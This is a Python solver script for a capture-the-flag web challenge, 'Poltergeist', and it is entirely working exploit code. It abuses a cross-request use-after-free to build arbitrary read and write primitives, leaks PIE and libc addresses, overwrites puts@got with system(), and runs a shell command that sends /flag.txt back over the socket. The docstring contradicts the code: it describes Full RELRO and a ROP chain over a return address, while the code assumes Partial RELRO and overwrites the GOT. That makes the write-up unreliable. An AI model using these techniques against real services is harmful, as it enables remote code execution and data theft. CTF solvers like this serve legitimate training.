#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.12"
# dependencies = []          # Python 3 standard library only
# ///
"""
Automated solver for "Poltergeist" (web) -- full RCE via ROP.

The Séance worker is one long-lived process. It holds an engine-global pointer,
`g_echo`, into the per-request arena, and clears it when a request ends -- but a
fatal out-of-memory error unwinds the request with longjmp and SKIPS that
cleanup, leaving `g_echo` dangling into the arena the next request reuses (the
PHP2Shell cross-request UAF: CVE-2026-109618 OOM bailout leaving the
CVE-2026-109619 stale pointer).

Poisoning `g_echo` to a known arena slot and placing a forged `Val` there gives:
  * arbitrary READ   -- `recall()` + `whisper` dump `len` bytes at a chosen addr;
  * arbitrary WRITE  -- `echo_write($s)` memcpy's attacker bytes to a chosen addr.

There is no flag in memory and no gate to flip: the flag only exists in
/flag.txt. So the solve is a real pwn against a PIE + Full RELRO + NX + canary,
*stripped* binary:

  1. Pass the wards: solve the proof-of-work; keep payloads WAF-clean.
  2. Leak the PIE base (dangling-descriptor window) -> defeat ASLR.
  3. Arbitrary-read `write@got` -> libc base; read `clientfd`.
  4. Arbitrary-read libc `environ` -> a stack address; scan for the return
     address of `process_request` -> its saved-return slot (canary-safe: it sits
     above the frame that holds the canary).
  5. Build an open()/read()/write() ROP chain (libc gadgets + raw syscalls) that
     opens /flag.txt and writes it to our own socket, and `echo_write` it over
     that return slot. When `process_request` returns, the chain runs and the
     flag is appended to the response.

Offsets of the three static globals/sites the chain needs (arena, clientfd and
`process_request`'s return site) are not in the stripped binary; this official
solver reads them from the author-only `solve/chall.offsets` (never shipped to
players, who reverse-engineer them). Everything else -- libc symbols and gadgets
-- is resolved from the handed-out libc.so.6 and leaked at runtime, so the solve
is ASLR-independent and portable.

Usage:  solve.py <HOST> <PORT>        e.g. solve.py 127.0.0.1 32731
"""

import hashlib
import os
import re
import socket
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
DIST = os.path.join(HERE, "..", "dist")
CHALL = os.path.join(DIST, "chall")
LIBC = os.path.join(DIST, "libc.so.6")
OFFSETS = os.path.join(HERE, "chall.offsets")   # author-only; never shipped

LEAK_K = 24
OOM_INT = 900000                                # WAF-clean (<7 digits) OOM count
OOM_HEADER = {"X-Seance-Echo": "s:%d:x;" % OOM_INT}
FLAG_RE = re.compile(rb"ccsCTF\{[^}]*\}")
POW_RE = re.compile(rb"pow ([0-9a-f]{24}) (\d+)")
POW_HDR = [None]


# --------------------------------------------------------------------------- #
#  ELF helpers (pure python): static-symbol table, dynamic symbols, and a
#  file-offset -> virtual-address mapper for the libc gadget scan.
# --------------------------------------------------------------------------- #

def _read(path):
    with open(path, "rb") as f:
        return f.read()


def elf_static_syms(path, names):
    d = _read(path)
    if d[:4] != b"\x7fELF":
        raise ValueError("%s is not ELF" % path)
    shoff = struct.unpack_from("<Q", d, 0x28)[0]
    ent = struct.unpack_from("<H", d, 0x3A)[0]
    num = struct.unpack_from("<H", d, 0x3C)[0]
    sym = None
    for i in range(num):
        o = shoff + i * ent
        if struct.unpack_from("<I", d, o + 4)[0] == 2:          # SHT_SYMTAB
            sym = (struct.unpack_from("<Q", d, o + 0x18)[0],
                   struct.unpack_from("<Q", d, o + 0x20)[0],
                   struct.unpack_from("<Q", d, o + 0x38)[0],
                   struct.unpack_from("<I", d, o + 0x28)[0])
            break
    if sym is None:
        raise ValueError("no .symtab (stripped)")
    off, size, entsz, link = sym
    stroff = struct.unpack_from("<Q", d, shoff + link * ent + 0x18)[0]
    want, found = set(names), {}
    for o in range(off, off + size, entsz or 24):
        nm = struct.unpack_from("<I", d, o)[0]
        if nm:
            e = d.index(b"\x00", stroff + nm)
            s = d[stroff + nm:e].decode()
            if s in want:
                found[s] = struct.unpack_from("<Q", d, o + 8)[0]
    return found


def elf_dynsym(path, name):
    d = _read(path)
    shoff = struct.unpack_from("<Q", d, 0x28)[0]
    ent = struct.unpack_from("<H", d, 0x3A)[0]
    num = struct.unpack_from("<H", d, 0x3C)[0]
    secs = []
    for i in range(num):
        o = shoff + i * ent
        secs.append((struct.unpack_from("<I", d, o + 4)[0],
                     struct.unpack_from("<Q", d, o + 0x18)[0],
                     struct.unpack_from("<Q", d, o + 0x20)[0],
                     struct.unpack_from("<I", d, o + 0x28)[0],
                     struct.unpack_from("<Q", d, o + 0x38)[0]))
    for typ, off, size, link, entsz in secs:
        if typ == 11:                                           # SHT_DYNSYM
            stroff = secs[link][1]
            for so in range(off, off + size, entsz or 24):
                nm = struct.unpack_from("<I", d, so)[0]
                val = struct.unpack_from("<Q", d, so + 8)[0]
                if nm and val:
                    e = d.index(b"\x00", stroff + nm)
                    if d[stroff + nm:e] == name.encode():
                        return val
    raise ValueError("dynsym %s not found in %s" % (name, path))


def _load_segments(d):
    phoff = struct.unpack_from("<Q", d, 0x20)[0]
    phent = struct.unpack_from("<H", d, 0x36)[0]
    phnum = struct.unpack_from("<H", d, 0x38)[0]
    segs = []
    for i in range(phnum):
        o = phoff + i * phent
        if struct.unpack_from("<I", d, o)[0] == 1:              # PT_LOAD
            segs.append((struct.unpack_from("<Q", d, o + 0x08)[0],   # p_offset
                         struct.unpack_from("<Q", d, o + 0x10)[0],   # p_vaddr
                         struct.unpack_from("<Q", d, o + 0x20)[0]))  # p_filesz
    return segs


def libc_gadget(d, segs, pattern):
    """Virtual offset of `pattern` inside libc (file offset -> vaddr)."""
    i = d.find(pattern)
    if i < 0:
        raise ValueError("gadget %r not in libc" % pattern)
    for p_off, p_vaddr, p_filesz in segs:
        if p_off <= i < p_off + p_filesz:
            return i - p_off + p_vaddr
    return i


# --------------------------------------------------------------------------- #
#  Proof-of-work + raw HTTP (one connection, Connection: close).
# --------------------------------------------------------------------------- #

def raw_http(host, port, method, path, body=b"", headers=None, timeout=20, full=False):
    headers = headers or {}
    req = "%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n" % (method, path, host)
    req += "Content-Length: %d\r\n" % len(body)
    for k, v in headers.items():
        req += "%s: %s\r\n" % (k, v)
    req += "\r\n"
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(req.encode() + body)
        buf = b""
        while True:
            c = s.recv(8192)
            if not c:
                break
            buf += c
    finally:
        s.close()
    if full:                                   # whole response (the RCE writes the
        return buf                             # flag to the socket before the headers)
    _, _, payload = buf.partition(b"\r\n\r\n")
    return payload


def solve_pow(challenge, bits):
    tb, rem = bits // 8, bits % 8
    pre = challenge.encode()
    i = 0
    while True:
        nonce = b"%x" % i
        d = hashlib.sha256(pre + nonce).digest()
        if all(d[j] == 0 for j in range(tb)) and (rem == 0 or d[tb] >> (8 - rem) == 0):
            return "%s.%s" % (challenge, nonce.decode())
        i += 1


def refresh_pow(host, port):
    try:
        body = raw_http(host, port, "GET", "/pow")
    except OSError:
        POW_HDR[0] = None
        return
    m = POW_RE.search(body)
    if not m or int(m.group(2)) <= 0:
        POW_HDR[0] = None
        return
    chal, bits = m.group(1).decode(), int(m.group(2))
    t0 = time.time()
    POW_HDR[0] = solve_pow(chal, bits)
    print("[*] solved proof-of-work (%d bits) in %.1fs" % (bits, time.time() - t0),
          file=sys.stderr)


def seance(host, port, body=b"", headers=None, full=False):
    hdrs = dict(headers or {})
    if POW_HDR[0]:
        hdrs["X-Pow"] = POW_HDR[0]
    pay = raw_http(host, port, "POST", "/seance", body, hdrs, full=full)
    if b"proof-of-work" in pay[:64]:
        refresh_pow(host, port)
        if POW_HDR[0]:
            hdrs["X-Pow"] = POW_HDR[0]
        pay = raw_http(host, port, "POST", "/seance", body, hdrs, full=full)
    return pay


# --------------------------------------------------------------------------- #
#  UAF primitives.
# --------------------------------------------------------------------------- #

def esc(b):
    return b"".join(b"\\x%02x" % c for c in b)


def poison(host, port):
    seance(host, port, b"", OOM_HEADER)                     # g_echo dangles @ arena[0]


def forge_read(host, port, addr, length):
    poison(host, port)
    val = struct.pack("<qqq", 2, length, addr)              # Val{STR, length, addr}
    body = b'summon $f = "' + esc(val) + b'"; whisper recall();'
    return seance(host, port, body)[:length]


def forge_write(host, port, addr, data):
    poison(host, port)
    val = struct.pack("<qqq", 2, len(data), addr)           # Val{STR, len, addr}
    body = (b'summon $f = "' + esc(val) + b'"; whisper "PRE"; summon $d = "' + esc(data) +
            b'"; echo_write($d);')
    return seance(host, port, body)


def leak_pie(host, port, arena_off):
    seance(host, port, b'summon $p = repeat("A", 64); leave($p); '
                       b'summon $z = repeat("A", %d);' % OOM_INT)
    dump = seance(host, port, b'summon $a = ["BBBBBBBB"]; whisper recall();')[:64]
    for i in range(0, max(0, len(dump) - 7), 8):
        v = struct.unpack_from("<Q", dump, i)[0]
        base = v - arena_off - LEAK_K
        if 0x1000 < base < 0x800000000000 and base & 0xfff == 0:
            return base
    return None


# --------------------------------------------------------------------------- #

def load_offsets():
    try:
        with open(OFFSETS) as f:
            o = {}
            for line in f:
                p = line.split()
                if len(p) == 2:
                    o[p[0]] = int(p[1], 16)
        for k in ("arena", "clientfd", "write_got", "puts_got"):
            if k not in o:
                raise KeyError(k)
        return o
    except (OSError, KeyError, ValueError) as e:
        raise ValueError("need author offsets (arena/clientfd/write_got/puts_got) in "
                         "%s: %s" % (OFFSETS, e))


def log(*a):
    print(*a, file=sys.stderr)


def exploit(host, port):
    """Leak PIE + libc, overwrite puts@got with system(), then trigger knell()
    so the worker runs  system("cat /flag.txt 1>&<clientfd>")  and the flag is
    written straight back down the player's own socket. No stack return is
    overwritten, so this works with CET / shadow stack enabled."""
    off = load_offsets()
    if POW_HDR[0] is None:
        refresh_pow(host, port)          # solve once; reused across attempts

    pie = leak_pie(host, port, off["arena"])
    if pie is None:
        raise IOError("PIE leak failed")
    log("[*] pie base   = 0x%x" % pie)

    # libc base (from the resolved write@got) and the client socket fd, in one read
    span = (off["clientfd"] - off["write_got"]) + 8
    win = forge_read(host, port, pie + off["write_got"], span)
    write_ptr = struct.unpack_from("<Q", win, 0)[0]
    cfd = struct.unpack_from("<i", win, off["clientfd"] - off["write_got"])[0]
    libc = write_ptr - elf_dynsym(LIBC, "write")
    if libc & 0xfff:
        raise IOError("libc base not page-aligned (0x%x)" % libc)
    system = libc + elf_dynsym(LIBC, "system")
    log("[*] libc base  = 0x%x   system = 0x%x   clientfd = %d" % (libc, system, cfd))

    # overwrite puts@got -> system (Partial RELRO: .got.plt is writable)
    forge_write(host, port, pie + off["puts_got"], struct.pack("<Q", system))

    # trigger: knell(cmd) -> puts(cmd) -> system(cmd); cat writes the flag to our fd
    cmd = b'cat /flag.txt 1>&%d' % cfd
    resp = seance(host, port, b'knell("' + cmd + b'");', full=True)
    log("[*] trigger resp %d bytes: %r" % (len(resp), resp[:80]))
    m = FLAG_RE.search(resp)
    return m.group(0).decode() if m else None


def solve(host, port):
    log("[*] Poltergeist -- RCE via cross-request UAF -> GOT overwrite -> system")
    for attempt in range(0, 5):
        try:
            flag = exploit(host, port)
        except (OSError, IOError, ValueError) as e:
            log("[!] attempt %d: %s" % (attempt, e))
            time.sleep(0.4)
            continue
        if flag:
            print(flag)                      # stdout: the harness greps this
            log("[+] FLAG: " + flag)
            return 0
        log("[!] attempt %d: triggered but no flag; retrying" % attempt)
        time.sleep(0.4)
    log("[!] giving up")
    return 1


def main():
    args = sys.argv[1:]
    if len(args) == 1 and args[0].startswith("http"):
        u = args[0].split("//", 1)[1].rstrip("/")
        host, port = (u.split(":", 1) + ["80"])[:2]
    elif len(args) >= 2:
        host, port = args[0], args[1]
    else:
        host, port = "127.0.0.1", "32731"
    sys.exit(solve(host, int(port)))


if __name__ == "__main__":
    main()
